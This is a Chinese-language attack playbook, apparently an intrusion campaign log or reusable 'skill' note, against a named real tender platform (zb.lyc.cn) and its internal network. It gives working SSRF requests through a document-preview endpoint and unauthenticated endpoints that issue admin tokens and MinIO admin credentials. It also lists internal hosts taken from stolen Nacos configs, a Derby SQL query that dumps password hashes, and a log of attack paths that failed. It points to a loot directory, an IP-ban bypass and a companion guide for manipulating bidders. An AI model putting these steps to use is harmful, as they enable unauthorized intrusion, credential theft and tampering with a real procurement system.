# 优智采系招标平台(zb.lyc.cn)内网取数实战配方 — 2026-09

目标:`https://zb.lyc.cn`(洛阳轴承招标采购平台,优智采/优质采白标)｜IP `61.136.78.115`
同机还跑:MinIO `:10000`、FastMeeting(好视通)`:28443`
落点:跳板机(见 `ip-ban-bypass`);loot 目录 `/tmp/lyc_loot/`、`/tmp/lyc_loot/goal2_20260910/`

## 1. 回显型原语(本战役最大的效率跃升)

```bash
# ⭐ 回显型:内网响应体原样返回,不需要 OCR
GET https://zb.lyc.cn/filepreview/file/onlyofficeCallBackPreview?fileUrl=<urlencode(内网URL)>
#   验证:fileUrl 指向自己的监听器 → 返回体 == 监听器返回体(实测 Content-Length: 23)

# 转换型(旧路径,慢):只回 {"data":"<uuid>"},PDF 落 MinIO fileupload/html2pdf/... 再 pdftoppm+tesseract
POST https://zb.lyc.cn/gateway/supply-bidding/file/convertUrl2Pdf   {"convertUrl":"...","fileName":"a.pdf"}
```
- 平台在目标 URL 后追加 `&time=<epoch_ms>`(不是早期报告里记的 `?timo=`)⇒ 自己的参数放最前
- 取数方出口/UA 实测:`61.136.78.130` + `Mozilla/5.0 (X11; Linux x86_64, rv:102.0)`;另一出口 `222.88.92.12` + `Java/1.8.0_212`
- `/filepreview/file/preview?fileUrl=` → 500;`/filepreview/file/pdfCallBackPreview` → 404(回显原语只有 OO 那条)

## 2. 免鉴权入口(网关 `security.ignoreUrls` 白名单)

```bash
POST /gateway/getDeployAuthorToken    {}            # → RS256 kid=YZC-MALL scope=ALL,~7天
POST /gateway/getThirdAuthorToken     {}            # → RS256 evalUserType=4
GET  /gateway/evaltool/fileDecrypt/getOssSecurityTokenBySts   # → MinIO admin STS(零认证)
```
- 拿到的票直接当 `Authorization: Bearer <token>`;注意返回的 `data` 常自带 `Bearer ` 前缀,别加两层

## 3. 内网面(从 Nacos 57 份配置里抽)

| 服务 | 地址 | 可达性(从平台 pod 出) |
|---|---|---|
| Nacos | `nacos-node1.ahyzc.com:8848` | ✅ 经 SSRF(跳板本身 DNS 不解析) |
| RabbitMQ 管理台 | `rabbitmq.ahyzc.com:15672` | ✅ 读到登录页(`/api/*` 需 Basic,取数器不认 userinfo ⇒ 拿不到) |
| ES `8.2.2` | `es.ahyzc.com:9200` | ✅ `_cat` 可读(Basic 同样拿不到) |
| 中台网关 | `consul-node{1,2,3}[-test].ahyzc.com:1000` | 部分路径可读(`/member/*`、`/databus/**`) |
| K8s 服务名 | `lyc-yzc-bigfile-service:8089`、`lyc-yzc-fileconvert-service:8560`、`jac-yzc-dataarchive-service:8561` 等 | `/` 有响应,`/actuator/*` 未暴露(返回同一份前端 loader 页 706B) |
| MySQL/Redis/MSSQL | `*.ahyzc.com:3306/6379/1433` | ❌ HTTP 取数器够不到(协议不匹配) |
| 洛轴自有机房 | `192.168.46.85/163/168/174:*`、`192.168.8.81:8011` | ❌ 全超时(pod 网络到不了;配置里是遗留地址) |

## 4. Nacos Derby 任意 SELECT(实证)

```bash
GET http://nacos-node1.ahyzc.com:8848/nacos/v1/cs/ops/derby
      ?username=nacos&password=<pw>&sql=<urlencode("select username,password from users --")>
# 返回: {"code":200,"data":[{"USERNAME":"nacos","PASSWORD":"$2a$10$ZI0HsP..."}]}
# config_info 计数 = 57(与手上配置数一致 ⇒ 确认是活库);sys.systables = 38;用户数 = 1
# 租户查询:只有 lyc-prod 一个租户 ⇒ 白标单实例,没有"别的租户配置"可捡
```
- 非查询语句被服务端拦:`CALL SQLJ.INSTALL_JAR('http://.../x.jar','app',0)` → `Only query statements are allowed`
- `sys.sysaliases` 只有内置 `SQLCAMESSAGE` ⇒ **没有前任留下的 UDF 可用**

## 5. 本战役确认「不通」的路(别重复)

| 路 | 结论 |
|---|---|
| K8s API(拿到 SA token) | 取数器**不转发自定义头** ⇒ 无 `Authorization` 就是 401,别耗 |
| `http://user:pass@host/` 打 ES/RabbitMQ Basic 面 | Java 取数器忽略 userinfo,返回空体 |
| XXE 打 `tenderplatform/api/WFUpdateStatus`、`bulletinSign/saveUploadFile`、`importWord`(OOXML) | 参数校验先挡 / Aspose 不展开 DTD 实体 ⇒ OOB 零命中 |
| `addCache4User` 造会话 | 写 200「操作成功」但读回 `data:null`,与老报告一致 ⇒ 键对不上,别当提权 |
| MinIO 自定义更新源 RCE | 2024-08 版 + 分布式模式,admin v3 update 不支持(426),`mc admin update` 已无 `--url` |
| FastMeeting(好视通)SOAP | 38 个操作全是用户/房间/录制管理,**无上传/命令类**;`/register/toDownload.do`(CVE 级任意文件读)404 = 已修/不同版本 |
| 洛轴 `192.168.46.x` 面 | 网络不可达(见 §3) |

## 6. 业务面(参标方控制)另见

招标/竞价平台的业务杠杆(审核驳回、移出参标人、轮次淘汰、FastMeeting 踢人/清场)见
`bidding-participant-control` 技能的 `references/lyc-zb-2026-09-participant-apis.md`。
